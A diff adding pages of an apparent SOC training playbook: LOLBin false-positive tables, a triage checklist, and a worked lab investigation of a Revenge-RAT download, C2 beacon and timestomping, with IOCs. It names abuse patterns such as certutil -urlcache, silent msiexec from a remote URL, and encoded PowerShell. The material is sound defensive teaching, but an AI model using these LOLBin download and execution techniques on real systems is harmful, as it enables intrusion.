+<span class="cm"># - MFTECmd (Eric Zimmerman) — parses MFT and outputs CSV with both timestamp sets</span>
+<span class="cm"># - Autopsy — Timeline module shows both $SI and $FN timestamps</span>
+<span class="cm"># - Velociraptor — Windows.NTFS.MFT artifact collects both timestamp attributes</span></code></pre>
+
+<div class="callout note">
+  <strong>Key Takeaway:</strong> Sysmon EID2 is your real-time detection. MFT analysis ($SI vs. $FN comparison) is your forensic confirmation. If you see EID2 on a file that also has IDS alerts associated with it, you have strong evidence of an attacker actively trying to hide their tracks.
+</div>
+
+</article>
+</template>
+
+<!-- ═══════════════════════════════════════════════════
+     06 · False Positive Patterns
+     ═══════════════════════════════════════════════════ -->
+<template id="tpl-false-positives">
+<article class="topic">
+<h1>06 &middot; False Positive Patterns</h1>
+<hr class="divider">
+
+<p>Not every LOLBin execution is malicious. A huge part of SOC analysis is distinguishing real threats from legitimate system activity. Learning these common false positive patterns will save you hours of investigation time and reduce alert fatigue.</p>
+
+<h3>Legitimate PowerShell Usage</h3>
+<div class="table-wrap"><table>
+  <thead><tr><th>Source</th><th>What It Looks Like</th><th>Why It's Legitimate</th></tr></thead>
+  <tbody>
+    <tr>
+      <td><strong>SCCM / ConfigMgr</strong></td>
+      <td><code>powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Windows\ccmcache\..."</code></td>
+      <td>System Center Configuration Manager deploys software and runs compliance scripts via PowerShell. The parent process will be <code>CcmExec.exe</code> or <code>svchost.exe -k ccm</code>.</td>
+    </tr>
+    <tr>
+      <td><strong>Group Policy Scripts</strong></td>
+      <td><code>powershell.exe -File "\\domain.local\SYSVOL\...\script.ps1"</code></td>
+      <td>GPO startup/logon scripts. Parent is <code>gpscript.exe</code>. Scripts stored on SYSVOL share.</td>
+    </tr>
+    <tr>
+      <td><strong>Admin Automation</strong></td>
+      <td><code>powershell.exe -File "C:\AdminScripts\disk-cleanup.ps1"</code></td>
+      <td>IT administrators running maintenance scripts. Verify the script path and content match expected admin activity.</td>
+    </tr>
+    <tr>
+      <td><strong>DSC (Desired State Configuration)</strong></td>
+      <td><code>powershell.exe -NoProfile</code> spawned by <code>WmiPrvSE.exe</code></td>
+      <td>Windows DSC engine checking/applying configuration compliance. Runs periodically.</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<div class="callout lab">
+  <strong>Quick Check:</strong> Legitimate PowerShell scripts are usually <em>not</em> encoded (<code>-enc</code>), <em>not</em> downloading from external IPs, and <em>not</em> spawned by Office applications (winword.exe, excel.exe). If you see <code>-enc</code> + external IP + Office parent &rarr; malicious.
+</div>
+
+<h3>Legitimate certutil Usage</h3>
+<div class="table-wrap"><table>
+  <thead><tr><th>Scenario</th><th>What It Looks Like</th><th>Why It's Legitimate</th></tr></thead>
+  <tbody>
+    <tr>
+      <td><strong>Certificate enrollment</strong></td>
+      <td><code>certutil -pulse</code> or <code>certutil -store My</code></td>
+      <td>Checking or renewing certificates in the local certificate store</td>
+    </tr>
+    <tr>
+      <td><strong>CA management</strong></td>
+      <td><code>certutil -ca.cert</code> spawned by <code>mmc.exe</code></td>
+      <td>PKI admin using Certificate Authority snap-in</td>
+    </tr>
+    <tr>
+      <td><strong>CRL verification</strong></td>
+      <td><code>certutil -verify -urlfetch</code></td>
+      <td>Verifying certificate revocation list &mdash; connects to CA servers (not arbitrary IPs)</td>
+    </tr>
+  </tbody>
+</table></div>
+<p><strong>Red flags that distinguish malicious certutil:</strong> <code>-urlcache</code>, <code>-decode</code>, <code>-encode</code> flags, downloading to user-writable directories, parent process is <code>cmd.exe</code> spawned by a LOLBin chain.</p>
+
+<h3>Legitimate msiexec Usage</h3>
+<div class="table-wrap"><table>
+  <thead><tr><th>Scenario</th><th>What It Looks Like</th><th>Why It's Legitimate</th></tr></thead>
+  <tbody>
+    <tr>
+      <td><strong>Software deployment (SCCM)</strong></td>
+      <td><code>msiexec /i "C:\Windows\ccmcache\abc123\software.msi" /qn</code></td>
+      <td>SCCM deploying MSI packages. Source is local ccmcache, not a remote URL.</td>
+    </tr>
+    <tr>
+      <td><strong>Windows Updates</strong></td>
+      <td><code>msiexec /i "C:\Windows\Installer\..."</code></td>
+      <td>System installing updates from local Installer cache</td>
+    </tr>
+  </tbody>
+</table></div>
+<p><strong>Red flag:</strong> <code>msiexec /q /i http://...</code> &mdash; silent installation from a remote URL is almost always malicious.</p>
+
+<h3>Legitimate rundll32 Usage</h3>
+<div class="table-wrap"><table>
+  <thead><tr><th>Scenario</th><th>What It Looks Like</th><th>Why It's Legitimate</th></tr></thead>
+  <tbody>
+    <tr>
+      <td><strong>Windows shell operations</strong></td>
+      <td><code>rundll32.exe shell32.dll,SHCreateLocalServerRunDll {GUID}</code></td>
+      <td>Windows COM infrastructure &mdash; Explorer opening folder windows</td>
+    </tr>
+    <tr>
+      <td><strong>Control Panel</strong></td>
+      <td><code>rundll32.exe shell32.dll,Control_RunDLL</code></td>
+      <td>Opening Control Panel applets</td>
+    </tr>
+    <tr>
+      <td><strong>Printer management</strong></td>
+      <td><code>rundll32.exe printui.dll,PrintUIEntry</code></td>
+      <td>Windows print subsystem</td>
+    </tr>
+    <tr>
+      <td><strong>DLL from System32</strong></td>
+      <td><code>rundll32.exe C:\Windows\System32\*.dll,*</code></td>
+      <td>Calling functions in system DLLs &mdash; normal Windows operation</td>
+    </tr>
+  </tbody>
+</table></div>
+<p><strong>Red flags:</strong> DLL path outside System32/SysWOW64, <code>javascript:</code> in command line, DLL name that doesn't match known Windows DLLs, network connections from rundll32 (Sysmon EID3).</p>
+
+<h3>Decision Framework</h3>
+<p>When you encounter a LOLBin execution, run through this checklist:</p>
+<ol>
+  <li><strong>Parent process</strong> &mdash; Is the parent expected? (e.g., <code>CcmExec.exe</code> for SCCM, <code>services.exe</code> for services, <code>explorer.exe</code> for user actions)</li>
+  <li><strong>Command-line arguments</strong> &mdash; Do they contain URLs, encoded data, or suspicious paths?</li>
+  <li><strong>Time of execution</strong> &mdash; Business hours on a weekday vs. 3 AM on a Saturday?</li>
+  <li><strong>Endpoint context</strong> &mdash; Is this an admin workstation, a developer machine, or a regular user endpoint?</li>
+  <li><strong>Frequency</strong> &mdash; Has this exact command run before on this or other endpoints? (one-off = suspicious)</li>
+</ol>
+
+</article>
+</template>
+
+<!-- ═══════════════════════════════════════════════════
+     07 · Worked Example
+     ═══════════════════════════════════════════════════ -->
+<template id="tpl-worked-example">
+<article class="topic">
+<h1>07 &middot; Worked Example &mdash; ACMEONIONS Initial Access</h1>
+<hr class="divider">
+
+<p>This is a complete walkthrough of the initial access phase in the ACMEONIONS investigation. We will trace the attack from the first payload delivery through PowerShell execution, malware drop, and C2 establishment.</p>
+
+<h3>Step 1 &mdash; Payload Delivery</h3>
+<p>The investigation begins with Suricata alerts on the victim endpoint <code>192.168.56.30</code>:</p>
+
+<pre><code><span class="cm"># Suricata Alert: ET MALWARE Windows Executable Download</span>
+<span class="cm"># Source: 192.168.56.30 → Destination: 8.253.135.120</span>
+<span class="cm"># URI: /Windows-Endpoint-Pro_ver_89_003.exe</span>
+
+<span class="cm"># Key observations from the alert:</span>
+<span class="cm"># 1. The destination is a DOTTED-QUAD IP (no domain name) → suspicious</span>
+<span class="cm"># 2. The filename masquerades as a Windows update tool</span>
+<span class="cm"># 3. The file was downloaded over cleartext HTTP</span></code></pre>
+
+<h3>Step 2 &mdash; Zeek HTTP Log Confirmation</h3>
+<p>Pivoting to Zeek HTTP logs for the same connection:</p>
+
+<pre><code><span class="cm"># zeek.http record for the payload download</span>
+id.orig_h:      192.168.56.30          <span class="cm"># Victim endpoint</span>
+id.resp_h:      8.253.135.120          <span class="cm"># Payload staging server (dotted-quad)</span>
+host:           8.253.135.120          <span class="cm"># No domain name — bare IP</span>
+method:         GET
+uri:            /Windows-Endpoint-Pro_ver_89_003.exe
+status_code:    200                    <span class="cm"># Download succeeded</span>
+resp_bytes:     342016                 <span class="cm"># ~334 KB — reasonable size for a RAT</span>
+user_agent:     (PowerShell UA or browser UA)
+referrer:       (empty)                <span class="cm"># No Referer header → not a normal browser click</span></code></pre>
+
+<div class="callout warn">
+  <strong>Red Flags Identified:</strong>
+  <ul>
+    <li>Dotted-quad host &mdash; no domain name, likely attacker-controlled infrastructure</li>
+    <li>Empty Referer header &mdash; not a normal user browsing action</li>
+    <li>Filename suggests a legitimate Windows tool &mdash; masquerading (T1036)</li>
+    <li>Executable downloaded over cleartext HTTP</li>
+  </ul>
+</div>
+
+<h3>Step 3 &mdash; Zeek Files Log &mdash; MIME Type Confirmation</h3>
+<pre><code><span class="cm"># zeek.files record confirms this is a PE executable</span>
+mime_type:      application/x-dosexec  <span class="cm"># Windows PE executable confirmed</span>
+source:         HTTP                   <span class="cm"># Downloaded over HTTP</span>
+tx_hosts:       8.253.135.120          <span class="cm"># Served by the dotted-quad IP</span>
+rx_hosts:       192.168.56.30          <span class="cm"># Received by the victim</span>
+total_bytes:    342016
+
+<span class="cm"># x-dosexec MIME type = this is absolutely a Windows executable</span>
+<span class="cm"># Combined with the dotted-quad delivery server, this is confirmed payload delivery</span></code></pre>
+
+<h3>Step 4 &mdash; PowerShell C2 Beacon</h3>
+<p>Shortly after the payload download, a new network connection appears:</p>
+
+<pre><code><span class="cm"># Sysmon Event ID 3 (Network Connection) — or zeek.conn</span>
+Process:        powershell.exe
+PID:            10072
+Source:         192.168.56.30
+Destination:    13.214.220.108:80      <span class="cm"># Different IP from the download server!</span>
+
+<span class="cm"># Analysis:</span>
+<span class="cm"># - powershell.exe (PID 10072) is connecting outbound to a DIFFERENT external IP</span>
+<span class="cm"># - 8.253.135.120 was the payload staging server (download)</span>
+<span class="cm"># - 13.214.220.108 is the C2 server (command and control)</span>
+<span class="cm"># - Attackers often separate staging from C2 infrastructure</span>
+<span class="cm"># - This PowerShell instance was likely spawned by the downloaded payload</span></code></pre>
+
+<h3>Step 5 &mdash; Masquerading Analysis</h3>
+<p>Analyzing the downloaded file <code>Windows-Endpoint-Pro_ver_89_003.exe</code>:</p>
+
+<div class="table-wrap"><table>
+  <thead><tr><th>Check</th><th>Finding</th><th>Verdict</th></tr></thead>
+  <tbody>
+    <tr>
+      <td><strong>Filename</strong></td>
+      <td>"Windows-Endpoint-Pro" suggests a legitimate Windows endpoint protection tool</td>
+      <td>Masquerading &mdash; no Microsoft product by this name exists</td>
+    </tr>
+    <tr>
+      <td><strong>Download source</strong></td>
+      <td>Downloaded from 8.253.135.120 (dotted-quad, no domain)</td>
+      <td>Suspicious &mdash; legitimate software comes from named domains</td>
+    </tr>
+    <tr>
+      <td><strong>Hash lookup</strong></td>
+      <td>SHA256 hash submitted to VirusTotal / sandbox</td>
+      <td>Identified as <strong>Revenge-RAT</strong> &mdash; a Remote Access Trojan</td>
+    </tr>
+    <tr>
+      <td><strong>PE metadata</strong></td>
+      <td>VersionInfo may claim to be a Windows tool</td>
+      <td>Hash does not match any legitimate Microsoft binary (Winbindex check)</td>
+    </tr>
+    <tr>
+      <td><strong>Authenticode signature</strong></td>
+      <td>Not signed, or signed with an invalid/self-signed certificate</td>
+      <td>Legitimate Windows tools are always signed by Microsoft</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<h3>Step 6 &mdash; Timestomping Detection</h3>
+<pre><code><span class="cm"># Sysmon Event ID 2 — File Creation Time Changed</span>
+<span class="cm"># TargetFilename: C:\...\Windows-Endpoint-Pro_ver_89_003.exe</span>
+<span class="cm"># PreviousCreationUtcTime: 2024-09-15T08:23:41.000Z  (real — when it was downloaded)</span>
+<span class="cm"># CreationUtcTime:         2024-01-15T10:30:00.000Z  (fake — backdated by 8 months)</span>
+<span class="cm"># Image: C:\...\Windows-Endpoint-Pro_ver_89_003.exe  (the malware itself changed its own timestamp)</span>
+
+<span class="cm"># T1070.006 Timestomping CONFIRMED</span>
+<span class="cm"># The malware modified its own creation time to appear 8 months older</span>
+<span class="cm"># Purpose: blend with legitimate files, evade "recently created" filters</span></code></pre>
+
+<h3>Step 7 &mdash; Complete Attack Timeline</h3>
+<div class="table-wrap"><table>
+  <thead><tr><th>Time</th><th>Event</th><th>Source</th><th>ATT&amp;CK</th></tr></thead>
+  <tbody>
+    <tr>
+      <td><strong>T-zero</strong></td>
+      <td>HTTP GET to <code>8.253.135.120/Windows-Endpoint-Pro_ver_89_003.exe</code> &mdash; payload downloaded</td>
+      <td>Zeek HTTP, Suricata ET MALWARE alert</td>
+      <td>T1105 Ingress Tool Transfer</td>
+    </tr>
+    <tr>
+      <td><strong>T+seconds</strong></td>
+      <td>File creation time modified (timestomped 8 months back)</td>
+      <td>Sysmon EID2</td>
+      <td>T1070.006 Timestomping</td>
+    </tr>
+    <tr>
+      <td><strong>T+1 min</strong></td>
+      <td>Payload executes &mdash; identified as Revenge-RAT</td>
+      <td>Sysmon EID1</td>
+      <td>T1036 Masquerading</td>
+    </tr>
+    <tr>
+      <td><strong>T+2 min</strong></td>
+      <td><code>powershell.exe</code> (PID 10072) connects to <code>13.214.220.108:80</code> (C2 server)</td>
+      <td>Sysmon EID3, Zeek conn</td>
+      <td>T1071 Application Layer Protocol</td>
+    </tr>
+    <tr>
+      <td><strong>T+5 min</strong></td>
+      <td>Persistence established (see Persistence Playbook)</td>
+      <td>Sysmon EID1, EID12/13</td>
+      <td>T1053 / T1547</td>
+    </tr>
+    <tr>
+      <td><strong>T+12 min</strong></td>
+      <td>Process injection into dwm.exe (see Persistence Playbook)</td>
+      <td>Sysmon EID8</td>
+      <td>T1055 Process Injection</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<h3>IOCs Extracted</h3>
+<pre><code><span class="cm"># Indicators of Compromise from the Initial Access phase</span>
+
+<span class="cm"># Payload Staging Server</span>
+IP:    8.253.135.120
+Proto: HTTP (port 80)
+URI:   /Windows-Endpoint-Pro_ver_89_003.exe
+
+<span class="cm"># C2 Server</span>
+IP:    13.214.220.108
+Proto: HTTP (port 80)
+
+<span class="cm"># Malware</span>
+Filename: Windows-Endpoint-Pro_ver_89_003.exe
+Type:     Revenge-RAT
+MIME:     application/x-dosexec
+Size:     ~342 KB
+
+<span class="cm"># Behavioral Indicators</span>
+- PowerShell (PID 10072) connecting to external IP
+- Timestomping detected on payload file (Sysmon EID2)
+- Dotted-quad HTTP download with no Referer header
+- x-dosexec MIME type in zeek.files</code></pre>
+
+<div class="callout lab">
+  <strong>Investigation Continues:</strong> This initial access analysis established the T-zero timeline, identified the payload and C2 infrastructure, and confirmed masquerading and timestomping techniques. The next phase &mdash; <strong>Persistence Detection</strong> &mdash; will investigate how the attacker maintained access after the initial compromise.
+</div>
+
+</article>
+</template>
+
+<script>
+window.NOTEBOOK = {
+  title: 'Playbook — Initial Access',
+  topics: [
+    { id: 'alert-recognition', badge: '01', label: 'Alert Recognition'           },
+    { id: 'picerl-steps',      badge: '02', label: 'PICERL Investigation Steps'  },
+    { id: 'payload-delivery',   badge: '03', label: 'Payload Delivery Analysis'  },
+    { id: 'lolbins',           badge: '04', label: 'LOLBin Abuse Detection'      },
+    { id: 'masquerading',      badge: '05', label: 'Masquerading & Timestomping' },
+    { id: 'false-positives',   badge: '06', label: 'False Positive Patterns'     },
+    { id: 'worked-example',    badge: '07', label: 'Worked Example'              },
+  ]
+};
+</script>
+<script src="js/app.js"></script>
+</body>
+</html>
